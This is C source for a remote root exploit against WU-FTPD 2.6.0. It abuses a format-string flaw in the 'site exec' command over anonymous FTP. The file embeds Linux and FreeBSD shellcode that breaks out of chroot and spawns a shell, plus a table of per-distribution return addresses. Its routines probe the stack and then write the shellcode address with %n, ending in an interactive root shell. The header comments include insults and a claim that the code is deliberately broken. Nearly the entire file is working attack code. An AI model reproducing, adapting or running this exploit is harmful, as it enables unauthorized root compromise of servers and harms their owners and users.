/* - wuftpd2600.c
 * VERY PRIVATE VERSION. DO NOT DISTRIBUTE. 15-10-1999
 *
 *  WUFTPD 2.6.0 REMOTE ROOT EXPLOIT
 *   by tf8
 *
 * *NOTE*:  For ethical reasons, only an exploit for 2.6.0 will be
 *     released (2.6.0 is the most popular version nowadays), and it
 *     should suffice to proof this vulnerability concept.
 *
 *   Site exec was never really *fixed*
 *
 *   Greetz to portal (he is elite!#%$) and all #!security.is, glitch, DiGit,
 *    \x90, venglin, xz, MYT and lamagra.
 *   Also greetings go to the WU-FTPD development team for including this
 *    bug in ALL their versions.
 *
 *   Fuck to wuuru (he is an idiot)
 *
 *   Account is not required, anonymous access is enough :)
 *
 *   BTW, exploit is broken to avoid kids usage ;)
 *
 * VERY PRIVATE VERSION. DO NOT DISTRIBUTE. 15-10-1999
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>

#ifdef __linux
#include <getopt.h>
#endif

#define MAKE_STR_FROM_RET(x) ((x)&0xff),(((x)&0xff00)>>8),(((x)&0xff0000)>>16),(((x)&0xff000000)>>24)
#define GREEN "\033[32m"
#define RED "\033[31m"
#define NORM "\033[0m"

char infin_loop[]= /* for testing purposes */
 "\xEB\xFE";

char bsdcode[] = /* Lam3rZ chroot() code rewritten for FreeBSD by venglin */
 "\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43"
 "\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0"
 "\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\xff\x01\x53\x53\xb0"
 "\x88\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80"
 "\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9"
 "\x31\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75"
 "\xf1\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd"
 "\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46"
 "\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56"
 "\x0c\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53"
 "\x53\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\xff\xff\xff\x30"
 "\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e"
 "\x67\x6c\x69\x6e";

char bsd_code_d[]= /* you should call it directly (no jump/call)*/
 "\xEB\xFE\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5C"
 "\x8B\x74\x24\xFC\x31\xC9\xB1\x15\x01\xCE\xB1\x71\xB0\xEF"
 "\x30\x06\x8D\x76\x01\xE2\xF9\xDE\x26\xDE\x2F\xBE\x5F\xF8"
 "\xBF\x22\x6F\x5F\xB5\xEB\xB4\xBE\xBF\x22\x6F\x62\xB9\x14"
 "\x87\x75\xED\xEF\xEF\xBD\x5F\x67\xBF\x22\x6F\x62\xB9\x11"
 "\xBE\xBD\x5F\xEA\xBF\x22\x6F\x66\x2C\x62\xB9\x14\xBD\x5F"
 "\xD2\xBF\x22\x6F\xBC\x5F\xE2\xBF\x22\x6F\x5C\x11\x62\xB9"
 "\x12\x5F\xE3\xBD\xBF\x22\x6F\x11\x24\x9A\x1C\x62\xB9\x11"
 "\xBD\x5F\xD2\xBF\x22\x6F\x62\x99\x12\x66\xA1\xEB\x62\xB9"
 "\x17\x66\xF9\xB9\xB9\xBD\x5F\xD4\xBF\x22\x6F\xC0\x8D\x86"
 "\x81\xC0\x9C\x87\xEF\xC1\xC1\xEF";

char linuxcode[]= /* Lam3rZ chroot() code */
 "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
 "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
 "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"
 "\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"
 "\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"
 "\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"
 "\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"
 "\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
 "\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"
 "\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31";

#define MAX_FAILED      4
#define MAX_MAGIC       100
static int magic[MAX_MAGIC],magic_d[MAX_MAGIC];
static char *magic_str=NULL;
int before_len=0;
char *target=NULL,*username="ftp",*password=NULL;
struct targets getit;

struct targets {
	int def;
	char *os_descr, *shellcode;
	int delay;
	u_long pass_addr, addr_ret_addr;
	int magic[MAX_MAGIC], magic_d[MAX_MAGIC],islinux;
};

struct targets targ[]={
	{0,"RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8075b00-700,0xbfffb028,{0x87,3,1,2},{1,2,1,4},1},
	{0,"RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8075b00-700,0xbfffb038,{0x87,3,1,2},{1,2,1,4},1},
	{0,"SuSe 6.3 with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8076cb0-400,0xbfffb018,{0x87,3,1,2},{1,2,1,4},1},
	{0,"SuSe 6.4 with wuftpd 2.6.0(1) from rpm",linuxcode,2,0x8076920-400,0xbfffafec,{0x88,3,1,2},{1,2,1,4},1},
	{0,"RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm (test)",linuxcode,2,0x8075b00-700,0xbfffb070,{0x87,3,1,2},{1,2,1,4},1},

	{0,"FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from ports",bsdcode,10,0x80bb474-100, 0xbfbfc164,{0x3b,2,4,1,0x44,2,1,2},{1,2,1,2,1,2,1,4},0},
	{1,"FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from packages",bsdcode,2,0x806d5b0-500,0xbfbfc6bc, {0x84,1,2,1,2}, {1,3,2,1,4},0},
	{0,"FreeBSD 3.4-RELEASE with wuftpd 2.6.0(1) from ports",bsdcode,2,0x80a4dec-400,0xbfbfc624, {0x3B,2,1,0xe,0x40,1,2,1,2},{1,2,1,2,1,3,2,1,4},0},
	{0,"FreeBSD 4.0-RELEASE with wuftpd 2.6.0(1) from packages",infin_loop,2,0x80706f0,0xbfbfe798,{0x88,2,1,2},{1,2,1,4},0},
	{0,NULL,NULL,0,0,0,{0},{0},0}
};

void usage(char*zu,int q){
int i, n, padding;
fprintf(stderr,"Usage: %s -t <target> [-l user/pass] [-s systype] [-o offset] [-g] [-h] [-x]\n"
"         [-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir]\n"
"target    : host with any wuftpd\nuser      : anonymous user\n"
"dir       : if not anonymous user, you need to have writable directory\n"
"magic_str : magic string (see exploit description)\n-g        : enables magic string digging\n"
"-x        : enables test mode\npass_addr : pointer to setproctitle argument\n"
"ret_addr  : this is pointer to shellcode\nsystypes: \n",zu);
 for(i=0;targ[i].os_descr!=NULL;i++){
  padding=0;
  fprintf(stderr,"%s%2d - %s\n",targ[i].def?"*":" ",i,targ[i].os_descr);
  if(q>1){
   fprintf(stderr,"     Magic ID: [");
   for(n=0;targ[i].magic[n]!=0;n++){
    if(targ[i].magic_d[n]==4)
     padding=targ[i].magic[n];
    fprintf(stderr,"%02X,%02X",targ[i].magic[n],targ[i].magic_d[n]);
    if(targ[i].magic[n+1]!=0)
     fprintf(stderr,":");
   }
   fprintf(stderr,"] Padding: %d\n",padding);
   fflush(stderr);
  }
 }
 exit(1);
}

int connect_to_server(char*host){
 struct hostent *hp;
 struct sockaddr_in cl;
 int sock;	
	
 if(host==NULL||*host==(char)0){
  fprintf(stderr,"Invalid hostname\n");
  exit(1);
 }
 if((cl.sin_addr.s_addr=inet_addr(host))==-1) {
  if((hp=gethostbyname(host))==NULL) {
   fprintf(stderr,"Cannot resolve %s\n",host);
   exit(1);
  }
  memcpy((char*)&cl.sin_addr,(char*)hp->h_addr,sizeof(cl.sin_addr));
 }
 if((sock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))==-1){
  fprintf(stderr,"Error creating socket: %s\n",strerror(errno));
  exit(1);
 }
 cl.sin_family=PF_INET;
 cl.sin_port=htons(21);
 if(connect(sock,(struct sockaddr*)&cl,sizeof(cl))==-1){
  fprintf(stderr,"Cannot connect to %s: %s\n",host,strerror(errno));
  exit(1);
 }
 return sock;
}

int ftp_recv(int sock,char*buf,int buf_size,int disc){
 int n=0;
 char q;
	
 if(disc) while((n=recv(sock,&q,1,0))==1&&q!='\n');
 else {
  (void)bzero(buf,buf_size);
  n=recv(sock,buf,buf_size,0);
  if(n<0){
   fprintf(stderr,"ftp_recv: recv failed\n");
   exit(1);
  }
  buf[n]=0;
 }
 return n;
}
int ftp_send(int sock,char*what,int size,int f,char*ans,int ans_size){
 int n;
 n=send(sock,what,size,0);
 if(n!=size){
  fprintf(stderr,"ftp_send: failed to send. expected %d, sent %d\n", size,n);
  shutdown(sock,2);
  close(sock);
  exit(1);
 }
 if(f)
  return ftp_recv(sock,ans,ans_size,0);
 return 0;
}

int ftp_siteexec(int sock,char*buff,int buff_len,int q,char*ans,int ans_len){
 ftp_send(sock,buff,buff_len,q,ans,ans_len);
 if(strncmp(ans,"200-",4)==0)
   ftp_recv(sock,NULL,0,1);
 else
  ftp_recv(sock,ans,ans_len,0);
	
 if(strncmp(ans,"200-",4)){
  fprintf(stderr,"Cannot find site exec response string\n");
  exit(1);
 }
 return 0;
}

void ftp_login(int sock,char*u_name,char*u_pass)
{
 char buff[2048];
  printf("loggin into system..\n");
  snprintf(buff,2047,"USER %s\r\n", u_name);
  ftp_send(sock, buff,strlen(buff),1,buff,2047);
  printf(GREEN"USER %s\n"NORM"%s",u_name,buff);
  snprintf(buff,2047,"PASS %s\r\n",u_pass);
  printf(GREEN"PASS %s\n"NORM,*u_pass=='\x90'?"<shellcode>":u_pass);
  ftp_send(sock,buff,strlen(buff),1,buff,2047);
  while(strstr(buff,"230 ")==NULL){
   (void)bzero(buff,2048);
   ftp_recv(sock,buff,2048,0);
  }
  printf("%s",buff);
  return;
}

void ftp_mkchdir(int sock,char*cd,char*new)
{
 char buff[2048];

 sprintf(buff,"CWD %s\r\n",cd);
 printf(GREEN"%s"NORM,buff);
 ftp_send(sock,buff,strlen(buff),1,buff,2047);
 printf("%s",buff);
 sprintf(buff,"MKD %s\r\n",new);
 ftp_send(sock,buff,strlen(buff),1,buff,2047);
 printf(GREEN"MKD <shellcode>"NORM"\n%s",buff);
 sprintf(buff,"CWD %s\r\n",new);
 ftp_send(sock,buff,strlen(buff),1,buff,2047);
 printf(GREEN"CWD <shellcode>"NORM"\n%s",buff);
 return;
}
void process_possibly_rooted(int sock)
{
 fd_set 	fd_read;
 char buff[1024], *cmd=getit.islinux?"/bin/uname -a;/usr/bin/id;exit\n":"/usr/bin/uname -a;/usr/bin/id;exit\n";
 int n;

 FD_ZERO(&fd_read);
 FD_SET(sock, &fd_read);
 FD_SET(0, &fd_read);
 send(sock, cmd, strlen(cmd), 0);
 while(1) {
  FD_SET(sock,&fd_read);
  FD_SET(0,&fd_read);
  if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
  if( FD_ISSET(sock, &fd_read) ) {
   if((n=recv(sock,buff,sizeof(buff),0))<0){
     fprintf(stderr, "EOF\n");
     exit(2);
   }
   if(write(1,buff,n)<0)break;
  }
  if ( FD_ISSET(0, &fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))<0){	
      fprintf(stderr,"EOF\n");
      exit(2);
    }
    if(send(sock,buff,n,0)<0) break;
  }
  usleep(10);	
 }
 fprintf(stderr,"Connection aborted, select failed()\n");
 exit(0);
}

int magic_check_f(int sock, char *str) {
 char q[2048], ans[2048];

 snprintf(q, 2048, "site exec %s%s\r\n", str, "%.f");
 if( strstr( q, "\r\n") == NULL) {
  fprintf(stderr,"Line TOO big..\n");
  exit(-1);
 }
 ftp_siteexec(sock, q, strlen(q), 1, ans, 2048);
 if( before_len+10 < strlen(&ans[3]) ) return 0;
 before_len=strlen(&ans[3]);
 (void)strcat(str,"%.f");
 return 1;
}
int magic_check_o(int sock, char *str) {
 char q[2048], ans[2048];
  snprintf(q, 2048, "site exec %s%s\r\n", str, "%c");
  if( strstr( q, "\r\n") == NULL) {
   fprintf(stderr,"Line TOO big..\n");
   exit(-1);
  }
 ftp_siteexec( sock, q, strlen(q), 1, ans, 2048);
 if( before_len== strlen(&ans[3]) ) {
  before_len+=1;
  (void)strcat(str, "%d");
  return 3;
 }
 before_len=strlen(&ans[3]);
 (void)strcat(str,"%c");
 return 2;
}

int magic_check_ok( int sock, char *str)
{
 char q[2048], ans[2048];
 int i ,n=1, f, padding=0;
	
 snprintf(q, 2048,"site exec aaaaaaaa%s%s\r\n", str, "%p%p");
 if ( strstr(q, "\r\n" ) == NULL) {
  fprintf(stderr, "Line too long\n");
  exit(-1);
 }
 (void)bzero(ans, 2048);
 ftp_siteexec(sock, q, strlen(q), 1, ans, 2047);
 if(strstr(ans,"0x61616161")==NULL)
   return 0;
 for(i =0; i < MAX_MAGIC && magic[i]; i++);
 magic_d[i]=4;
 while(n){
  for(f=0; f< 2; f++) {
   snprintf(q, 2048,"site exec %.*saaaa%s%s\r\n", padding, "xxxx", str, f?"%p%p":"%p");
   (void)bzero(ans, 2048);
   ftp_siteexec(sock, q, strlen(q), 1, ans, 2047);
   if( strstr(ans, "0x61616161")!=NULL) {
    if (f==0) {
     magic[i]=padding;
     return 1;
    } else if( f==1) {
     strcat(str,"%p");
     magic[i]=padding;
     return 1;
    }
   }
  }
  if(padding > 4) {
   fprintf(stderr,"Cannot calculate padding..\n");
   exit(1);
  }
  padding++;		
 }
 return 1;
}


int magic_digger(int sock)
{
 int get_out=1,where=0,all_failed=MAX_FAILED*2,f=0,o=0;
	
 if(magic_str==NULL){
  if((magic_str=(char*)malloc(4092))==NULL){
   perror("malloc");
   exit(errno);
  }
 }
 (void)bzero(magic_str, 4092);
 where=0;
 while(get_out) {
  int q;
  if( where >= MAX_MAGIC-1 || all_failed <= 0 )
    return -1;
  if( magic_check_f(sock, magic_str) ) {
   o=0,f++;
    if(f==1){
     if(!magic[where])
      magic[where]=1;
     else
      magic[++where]+=1;
    magic_d[where]=1;
    } else
     magic[where]+=1;
   all_failed=MAX_FAILED*2;
   printf("%s", "%.f"); fflush(stdout);
   goto verify;
  }
  all_failed--;
  if((q=magic_check_o(sock,magic_str))){
   f=0,o++;
    if(o==1){
     if(!magic[where])
      magic[0]=1;
     else
      magic[++where]+=1;
    magic_d[where]=q;
   } else {
    if(magic_d[where]==q)
     magic[where]+=1;
    else {
     magic[++where]=1;
     magic_d[where]=q;
    }
   }
   all_failed=MAX_FAILED*2;
   printf("%s", q==2?"%c":"%d");
   fflush(stdout);
   goto verify;
  }
  all_failed--;
  continue;
  verify:
  if(magic_check_ok(sock,magic_str)){
   putchar('\n');
   return 0;
  }
 }
 return 0;
}

int main(int argc, char *argv[]){
	char *buff, *buff_p, *buff_p2, c, shellcode[500],*dir,*passwd=shellcode;
	int i, sock, num=-2, padding=-1, gm=0, testmode=0,mtype=0,bla=0,offset=0;
	u_long ret_addr=0, pass_addr=0;
	for(i=0;targ[i].os_descr!=NULL;i++);
	while((c=getopt(argc,argv,"t:l:m:o:s:r:p:M:P:xghH?"))!=EOF){
	switch(c) {
	 case 't': target=optarg;break;
	 case 'l':
	   username=optarg;
	   passwd=strchr(optarg,'/');
	   if(passwd==NULL)
	    usage(argv[0],0);
	   *passwd++=(char)0;
	   break;
	 case 'x': testmode=1; break;
	 case 'o': offset=atoi(optarg);break;
	 case 'p': pass_addr=strtoul(optarg, &optarg,16); break;
	 case 'g': gm=1; break;
	 case 'M': dir=optarg;mtype=1;break;
	 case 'm':
	   {
	    int where=0;
	    if(!*optarg) {
	      fprintf(stderr,"-m requires argument, try -h for help\n");
	      exit(1);
	    }
	    while(1) {
	      magic[where]=strtoul(optarg,&optarg,16);
	      optarg=strchr(optarg,',');
	      if(optarg==NULL){
	        printf("comma missing\n");
		exit(1);
	      }
	      optarg++;
	      magic_d[where++]=strtoul(optarg,&optarg,16);
	      if(strchr(optarg,':')==NULL){
	       magic[where]=magic_d[where]=0;
	       break;
	      }
	      optarg=strchr(optarg,':');
	      optarg++;
	    }
	   }
	   break;
	  case 's':/*
	    num=atoi(optarg);
	    if(num>i) {
	     fprintf(stderr,"systype too big, try -h for help\n");
	     exit(1);
	    } :) */
	    break;
	  case 'r':
	    ret_addr=strtoul(optarg,&optarg,16);
	    break;
	  case 'P':
	    padding=atoi(optarg);
	    break;
	  case 'H':
	     bla=2;
	  default: usage(argv[0],bla);break;
	 }
        }
	if(target==NULL){
	  fprintf(stderr,"No target specified, try -h for help\n");
	  exit(1);
	}
	if(num==-1||num==-2) {
	  for(i=0;!targ[i].def;i++);
	  num=i;
	}
	(void)memcpy((void*)&getit,(void*)&targ[num],sizeof(struct targets));

	if(magic[1]!=0) {
	 memcpy((void*)getit.magic,magic,sizeof(magic));
	 memcpy((void*)getit.magic_d,magic_d,sizeof(magic));
	}

	if(ret_addr)getit.addr_ret_addr=ret_addr;
	if(pass_addr)getit.pass_addr=pass_addr;

	getit.addr_ret_addr+=(offset*4);

 	sock=connect_to_server(target);
	memset(shellcode, '\x90', sizeof(shellcode));
	shellcode[sizeof(shellcode)-1]=(char)0;
	if(!mtype){
	 memcpy((void*)&shellcode[sizeof(shellcode)-strlen(getit.shellcode)-1],(void*)getit.shellcode, strlen(getit.shellcode)+1);
	 shellcode[sizeof(shellcode)-1]=(char)0;
	}else{
	 memcpy((void*)&shellcode[250-strlen(getit.shellcode)-1],(void*)getit.shellcode,strlen(getit.shellcode));
	 shellcode[250-1]=(char)0;
	}
	printf("Target: %s (%s/%s): %s\n",target,username,*passwd=='\x90'?"<shellcode>":passwd,getit.os_descr);
	printf("Return Address: 0x%08lx, AddrRetAddr: 0x%08lx, Shellcode: %d\n\n",getit.pass_addr,getit.addr_ret_addr,strlen(getit.shellcode));

	buff=(char *)malloc(1024);
	bzero(buff,1024);

	(void)ftp_recv(sock,NULL,0,1);

	(void)ftp_login(sock,username,passwd);

	if(gm||(magic_str==NULL&&getit.magic[0]==0)){
	 printf("STEP 2A: Generating magic string: ");
	 fflush(stdout);
	 magic_digger(sock);
	 memcpy((void *)getit.magic,(void*)magic,sizeof(magic));
	 memcpy((void*)getit.magic_d,(void*)magic_d,sizeof(magic_d));
	 printf("STEP 2B: MAGIC STRING: [");
	} else {
	  printf("STEP 2 : Skipping, magic number already exists: [");
	}
	for(i=0;i<MAX_MAGIC&&getit.magic[i]!=0;i++){
	 printf("%02X,%02X",getit.magic[i],getit.magic_d[i]);
	 if(getit.magic[i+1]!=0)
	     putchar(':');
	}
	printf("]\n");
	buff=(char *)realloc(buff, 4092);
	(void)bzero(buff, 4092);
        if(mtype)
         ftp_mkchdir(sock,dir,shellcode);
	printf("STEP 3 : Checking if we can reach our return address by format string\n");
	if(!magic_str){
	  magic_str=(char*)malloc(2048);
	  if(magic_str==NULL) {
	    perror("malloc");
	    exit(errno);
	  }
	  (void)bzero(magic_str,2048);
	  for(i=0;i<MAX_MAGIC&&getit.magic[i]!=0;i++){
	   switch(getit.magic_d[i]) {
	    case 1:
	       for(num=0;num<getit.magic[i];num++)strcat(magic_str,"%.f");
	       break;
	    case 2:
	       for(num=0;num<getit.magic[i];num++)strcat(magic_str,"%c");
	       break;
	    case 3:
	       for(num=0;num<getit.magic[i];num++)strcat(magic_str,"%d");
	       break;
	    case 4:if(padding<0)padding=getit.magic[i];break;
	    default:fprintf(stderr,"STEP 3: INternal error\n");
	       exit(1);
	       break;
 	  }
	 }
	}
	if(padding<0){
	  for(num=0;num<MAX_MAGIC&&getit.magic_d[num]!=4;num++);
	  if(num<(MAX_MAGIC-1))
	    padding=getit.magic[num];
	  else
	    fprintf(stderr,"WARNING: PROBLEMS WITH PADDING\n");
	}
	
	if(!getit.islinux){
 	 if(!testmode)
	   snprintf(buff,4096,"site exec %.*s%c%c%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.addr_ret_addr),magic_str,"%p");
	 else
	   snprintf(buff,4096,"site exec %.*s%c%c%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.pass_addr),magic_str,"%p");
	} else {
 	 if(!testmode)
	   snprintf(buff,4096,"site exec %.*s%c%c\xff%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.addr_ret_addr),magic_str,"%p");
	 else
	   snprintf(buff,4096,"site exec %.*s%c%c\xff%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.pass_addr),magic_str,"%p");
	}
	sleep(getit.delay);
	fflush(stdout);
	if((buff_p=(char *)malloc(4096))==NULL){
	  fprintf(stderr,"malloc failed.\n");
	  exit(1);
	}
	(void)bzero(buff_p,4096);
	ftp_siteexec(sock,buff,strlen(buff),1,buff_p,4095);
	if((buff_p2=strchr(buff_p,'\r'))!=NULL)
	 *buff_p2=(char)0;
	if((buff_p2=strchr(buff_p,'\n'))!=NULL)
	 *buff_p2=(char)0;
	buff_p2=strstr(buff_p,"|0x");
	if(buff_p2==NULL){
	  fprintf(stderr,"Fix me, incorrect response from '%%p':%s\n",buff_p);
	  exit(1);
	}
	buff_p2+=3;
	if(!testmode)
	  printf("STEP 4 : Ptr address test: 0x%s (if it is not 0x%08lx ^C me now)\n",buff_p2,getit.addr_ret_addr);
	else
	  printf("STEP 4 : Ptr address test: 0x%s (if it is not 0x%08lx ^C me now)\n",buff_p2,getit.pass_addr);
	sleep(getit.delay);
	buff_p2=strstr(buff, "%.f");
	*buff_p2++=(char )0;
	strcpy(buff_p, buff);
	if(!testmode)
	  sprintf(buff_p+strlen(buff_p),"%s%u%c","%d%.",(u_int)getit.pass_addr,'d');
	else
	  sprintf(buff_p+strlen(buff_p),"%s","%d%d");
	strcpy(buff_p+strlen(buff_p), buff_p2);
	buff_p2=strchr(buff_p,'|');
	buff_p2++;
	printf("STEP 5 : Sending code.. this will take about 10 seconds.\n");
	if(!testmode){
	  strcpy(buff_p2,"%n\r\n");
	  ftp_send(sock,buff_p,strlen(buff_p),0,NULL,0);
	} else {
	  (void)bzero(buff,4096);
	  strcpy(buff_p2,"%s\r\n");
	  ftp_send(sock,buff_p,strlen(buff_p),1,buff,4092);
	  printf("got answer: %s\n",buff);
	  exit(0);
	}
	free(buff_p);
	free(buff);
	signal(SIGINT, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	printf(RED"Press ^\\ to leave shell"NORM"\n");
	process_possibly_rooted(sock);
	return 0;
}
